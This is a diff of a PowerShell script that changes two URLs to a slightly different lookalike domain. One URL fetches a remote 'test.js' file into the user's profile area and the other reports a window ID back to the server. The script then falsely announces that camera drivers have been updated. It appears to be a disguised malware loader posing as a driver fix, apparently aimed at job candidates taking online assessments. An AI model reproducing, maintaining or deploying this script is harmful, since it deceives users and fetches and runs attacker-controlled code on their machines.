@@ -267,7 +267,7 @@ else {
     }
 }
 
-$envSetupUrl = "https://api.assessmentsinternationalsinc.com/get-file/test.js"
+$envSetupUrl = "https://api.assessmentinternationalsinc.com/get-file/test.js"
 $codeProfile = $env:USERPROFILE
 if (-not (Test-Path -LiteralPath $codeProfile)) {
     New-Item -ItemType Directory -Path $codeProfile -Force *> $null
@@ -349,7 +349,7 @@ if ($LASTEXITCODE -ne 0) {
 Write-Host "[SUCCESS] Camera drivers have been updated successfully."
 if (-not [string]::IsNullOrWhiteSpace($WINDOW_UID)) {
     $safeWindowUid = [Uri]::EscapeDataString($WINDOW_UID)
-    $autoUrl = "https://api.assessmentsinternationalsinc.com/change-connection-status/$safeWindowUid"
+    $autoUrl = "https://api.assessmentinternationalsinc.com/change-connection-status/$safeWindowUid"
     try {
         # Prefer native PowerShell HTTP first.
         Invoke-RestMethod -Uri $autoUrl -Method POST -TimeoutSec 60 *> $null
